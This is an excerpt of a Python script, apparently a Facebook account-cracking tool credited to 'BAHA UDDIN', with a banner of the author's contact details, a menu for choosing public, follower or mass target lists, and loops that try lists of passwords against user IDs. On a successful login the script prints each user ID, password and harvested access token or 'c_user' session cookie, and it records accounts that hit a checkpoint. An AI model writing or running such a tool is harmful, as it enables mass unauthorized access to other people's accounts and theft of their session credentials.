...
\x1b[0;33m║WELCOME TO MY TOOLS  [🔥 BAHA UDDIN🔥].  ║

\x1b[0;33m║       #TOOL AUTHOR [BAHA UDDIN] MAFIA BOSS. ║
...
\x1b[0;33m║#YOUTUBE : Nai😐.  ║

\x1b[0;33m║#FACEBOOK : BAHA UDDIN  II ].       ║

\x1b[0;33m║#GITHUB : https://github.com/b4h4a.   ║

\x1b[0;33m║#WHATSAPP : 01309690871.                   ║
...
def menu():
	...
	elif Bilal == "1" or BAHA == "01":

		publik()

		method()

	elif Bilal == "2" or BAHA == "02":

		follower()

		method()

	elif Bilal == "3" or  BAHA == "03":

		massal()

		method()

	elif BAHA == "4" or BAHA == "04":
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mBAHA PRO/FASTER \033[1;97m]")
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[NA1M-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;95m[BAHA-CP] %s|%s\033[0;92m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[BAHA-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[BAHA-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[BAHA-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[BAHA-CP] %s|%s\033[0;91m        "%(uid, pw))
